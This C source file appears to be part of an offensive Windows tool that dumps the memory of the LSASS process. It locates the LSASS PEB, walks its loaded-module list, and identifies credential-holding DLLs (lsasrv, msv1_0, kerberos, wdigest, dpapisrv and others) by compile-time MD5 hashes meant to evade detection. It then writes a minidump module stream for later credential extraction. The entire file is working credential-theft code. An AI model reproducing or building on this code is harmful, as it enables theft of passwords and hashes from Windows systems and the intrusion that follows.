#include <stdio.h>

#include "ElSass.h"
#include "AxiomDumper.h"
#include "dm.h"
#include "Glibc.h"
#include "compiletime_md5.hpp"
#include "autoxor.h"

static BOOL read_ldr_entry(HANDLE hProcess, PVOID ldr_entry_address, struct CREDZ_LDR_DATA_TABLE_ENTRY* ldr_entry, wchar_t* base_dll_name)
{
	DM_ReadVirtualMemory(hProcess, (ULONGLONG)ldr_entry_address, ldr_entry, sizeof(struct CREDZ_LDR_DATA_TABLE_ENTRY));
	memset(base_dll_name, 0, MAX_PATH);
	DM_ReadVirtualMemory(hProcess, (ULONGLONG)(ldr_entry->BaseDllName.Buffer), base_dll_name, ldr_entry->BaseDllName.Length);

	if (base_dll_name == NULL || base_dll_name[0] == '\0') {
		printf("[!] Reading LDR base name\n");
		return (false);
	}

	return (true);
}

static PVOID get_lsass_peb_address()
{
	ULONGLONG peb;

	peb = DM_GetProcessPEB(ELSASS_FindPid());
	printf("[+] PEB is at: 0x%px \n", peb);
	return ((PVOID)peb);
}

PVOID get_module_list_address(IN HANDLE hProcess)
{
	NTSTATUS status;
	PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;

	peb_address = get_lsass_peb_address();
	if (!peb_address)
		return NULL;

	status = 0;
	ldr_address = 0;
	ldr_pointer = RVA(PVOID, peb_address, LDR_POINTER_OFFSET);
	DM_ReadVirtualMemory(hProcess, (ULONGLONG)ldr_pointer, &ldr_address, sizeof(PVOID));

	printf("[+] Reading LDR pointer from virtual memory, status = %d, ldr_address is now: 0x%p\n", status, ldr_address);
	if (!NT_SUCCESS(status)) {
		printf("[!] Reading LDR pointer failed\n");
		return (NULL);
	}
	printf("[+] Call success !\n");

	ldr_entry_address = NULL;
	module_list_pointer = RVA(PVOID, ldr_address, MODULE_LIST_POINTER_OFFSET);
	status = 0;
	DM_ReadVirtualMemory(hProcess, (ULONGLONG)module_list_pointer, &ldr_entry_address, sizeof(PVOID));

	printf("[+] Reading modules head pointer from virtual memory, status = %d, entry address is now: 0x%p\n", status, ldr_entry_address);
	if (!NT_SUCCESS(status)) {
		printf("[!] Reading modules head pointer failed\n");
		return (NULL);
	}

	printf("[+] Module list address parsed: 0x%p\n", ldr_entry_address);
	return (ldr_entry_address);
}

static PC_MODULEINFO add_new_module(IN HANDLE hProcess, IN struct CREDZ_LDR_DATA_TABLE_ENTRY* ldr_entry)
{
	DWORD name_size;
	PC_MODULEINFO new_module = (PC_MODULEINFO)HeapAlloc(GetProcessHeap(), 0x00000008, sizeof(C_MODULEINFO));
	if (!new_module)
		return (NULL);

	new_module->next = NULL;
	new_module->dll_base = (ULONG64)(ULONG_PTR)ldr_entry->DllBase;
	new_module->size_of_image = ldr_entry->SizeOfImage;
	new_module->TimeDateStamp = ldr_entry->TimeDateStamp;
	new_module->CheckSum = ldr_entry->CheckSum;

	name_size = ldr_entry->FullDllName.Length > sizeof(new_module->dll_name) ?
		sizeof(new_module->dll_name) : ldr_entry->FullDllName.Length;

	DM_ReadVirtualMemory(hProcess, (ULONGLONG)ldr_entry->FullDllName.Buffer, new_module->dll_name, name_size);
	return new_module;
}

static PC_MODULEINFO find_modules(HANDLE hProcess, const uint64_t* importantHashes, int importantHashesCount)
{
	SHORT dlls_found;
	PC_MODULEINFO module_list = NULL;
	wchar_t base_dll_name[MAX_PATH];
	PVOID first_ldr_entry_address;
	struct CREDZ_LDR_DATA_TABLE_ENTRY ldr_entry;
	PVOID ldr_entry_address = get_module_list_address(hProcess);
	if (!ldr_entry_address) {
	printf("[!] get_m_address failed\n");
	return NULL;
	}

	dlls_found = 0;
	first_ldr_entry_address = NULL;
	while (dlls_found < importantHashesCount)
	{
		BOOL success = read_ldr_entry(hProcess, ldr_entry_address, &ldr_entry, base_dll_name);
		if (!success)
			return NULL;
		if (!first_ldr_entry_address)
			first_ldr_entry_address = ldr_entry.InLoadOrderLinks.Blink;

		for (int i = 0; i < importantHashesCount; i++)
		{
			char* c_base_dll_name = (char*)drunk_wchar_to_cstring(base_dll_name);
			uint64_t dllHash = compiletime_md5(c_base_dll_name);
			free(c_base_dll_name);
			if (importantHashes[i] == dllHash)
			{
				printf("[+] Module %ls (hash: 0x%llx) discovered at 0x%p\n", base_dll_name, dllHash, ldr_entry_address);
				PC_MODULEINFO new_module = add_new_module(hProcess, &ldr_entry);
				if (!new_module)
					return NULL;

				if (!module_list)
					module_list = new_module;
				else
				{
					PC_MODULEINFO last_module = module_list;
					while (last_module->next)
						last_module = last_module->next;
					last_module->next = new_module;
				}
				dlls_found++;
				break;
			}
		}

		ldr_entry_address = ldr_entry.InLoadOrderLinks.Flink;
		if (ldr_entry_address == first_ldr_entry_address)
		break;
	}

	return (module_list);
}

PC_MODULEINFO ELSASS_ExtractModulesList(PDUMPCONTEXT dc)
{
	ULONG32 stream_rva = dc->rva;
	ULONG32 full_name_length;
	PC_MODULEINFO module_list, curr_module;
	ULONG32 number_of_modules;
	ULONG32 stream_size;
	constexpr uint64_t importantHashes[] = {
		compiletime_md5("lsasrv.dll"),
		compiletime_md5("samsrv.dll"),
		compiletime_md5("ncrypt.dll"),
		compiletime_md5("kerberos.DLL"),
		compiletime_md5("cryptdll.dll"),
		compiletime_md5("msv1_0.dll"),
		compiletime_md5("tspkg.dll"),
		compiletime_md5("cloudAP.DLL"),
		compiletime_md5("rsaenh.dll"),
		compiletime_md5("wdigest.DLL"),
		compiletime_md5("dpapisrv.dll"),
		compiletime_md5("ncryptprov.dll"),
		compiletime_md5("livessp.dll"),
		compiletime_md5("kdcsvc.dll"),
		compiletime_md5("lsadb.dll"),
		compiletime_md5("eventlog.dll"),
		compiletime_md5("wevtsvc.dll"),
		compiletime_md5("termsrv.dll")
	};

	printf("[+] Starting dump of modules list header\n");
	module_list = find_modules(dc->hProcess, importantHashes, ARRAY_SIZE(importantHashes));
	if (!module_list)
	{
		printf("[!] Failed to write the ModuleListStream\n");
		return (NULL);
	}

	printf("[+] Dumping modules success !\n");

	curr_module = module_list;
	number_of_modules = 0;
	while (curr_module)
	{
		full_name_length = ((ULONG32)wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name)) + 1) * 2;
		curr_module->name_rva = dc->rva;

		ELSASS_Append(dc, &full_name_length, 4, 0x00);
		ELSASS_Append(dc, curr_module->dll_name, full_name_length, 0x00);

		curr_module = curr_module->next;
		number_of_modules++;
	}

	stream_rva = dc->rva;
	ELSASS_Append(dc, &number_of_modules, 4, 0x00);
	BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE] = { 0 };
	curr_module = module_list;
	while (curr_module)
	{
		DWORD offset = 0;
		DumpModule module;

		memset(&module, 0, sizeof(DumpModule));
		module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
		module.SizeOfImage = curr_module->size_of_image;
		module.CheckSum = curr_module->CheckSum;
		module.TimeDateStamp = curr_module->TimeDateStamp;
		module.ModuleNameRva = curr_module->name_rva;

		memset(module_bytes, 0, sizeof(module_bytes));
		memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
		memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
		memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
		memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
		memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
		memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
		memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
		memcpy(module_bytes + offset, &module.Reserved1, 8);

		ELSASS_Append(dc, module_bytes, sizeof(module_bytes), 0x00);
		curr_module = curr_module->next;
	}

	stream_size = 4 + (number_of_modules * sizeof(module_bytes));
	ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4, &stream_size, 4, 0x00);
	ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4 + 4, &stream_rva, 4, 0x00);

	return (module_list);
}

